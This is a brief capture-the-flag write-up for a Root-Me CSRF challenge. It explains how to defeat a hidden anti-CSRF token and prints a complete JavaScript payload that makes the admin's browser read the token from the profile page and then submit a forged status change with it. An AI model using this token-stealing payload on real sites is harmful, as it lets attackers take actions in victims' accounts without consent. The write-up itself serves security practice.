The idea is the same than in 0 protection, but you have a new field in the form.

```
<input id="token" type="hidden" name="token" value="cc2875d8ac95d68c491929e63fbff2df" />
```

If the token is not the one of the admin, you will not be able to modify the form. Well, no problem, we are just going to steal it.
For this, we are going to make the admin request the Profile page, read the token, and then do the same thing than before, but with the admin token.

```
<script>
        var url = "http://challenge01.root-me.org/web-client/ch23/?action=profile";
        var ajax = new XMLHttpRequest();
        ajax.open("GET", url, false);
        ajax.send();

        var regex = /.*<input.*id="token".*value="([a-f0-9]{32})".*\/>/g;
        token = regex.exec(ajax.response)[1];

        ajax = new XMLHttpRequest();
        ajax.open("POST", url);
        ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        ajax.send("username=test&status=on&token=" + token);
</script>
```

Send this script to the admin, wait a bit, and get the flag in private page.
